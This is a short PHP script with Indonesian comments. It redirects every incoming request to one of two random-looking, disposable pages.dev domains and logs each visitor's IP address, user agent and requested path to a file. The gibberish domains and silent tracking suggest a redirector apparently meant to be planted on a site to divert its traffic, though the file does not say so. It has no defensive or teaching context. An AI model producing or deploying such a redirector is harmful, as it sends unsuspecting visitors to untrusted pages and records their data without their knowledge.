<?php
// Daftar URL tujuan untuk redirect
$targetDomains = [
    'https://zzzascacacsacsacqweryuiopushdbjnlkfjsbhysuioijfkemwtnjbud8.pages.dev',
    'https://zzzzncvkasncnaiucb1j482901292ndaspdjas09cascmkancnancanca8.pages.dev'
];

// Pilih domain secara acak
$randomIndex = array_rand($targetDomains);
$targetUrl = $targetDomains[$randomIndex];

// Dapatkan path asli yang diminta
$requestedPath = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$cleanPath = str_replace('/service/', '', $requestedPath);

// LOGGING untuk tracking
$logData = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'requested_path' => $requestedPath,
    'clean_path' => $cleanPath,
    'selected_domain' => $targetUrl,
    'random_index' => $randomIndex
];

// Simpan log
file_put_contents('redirect_log.txt', json_encode($logData) . PHP_EOL, FILE_APPEND | LOCK_EX);

// Redirect langsung tanpa delay
header("Location: $targetUrl");
exit();
?>
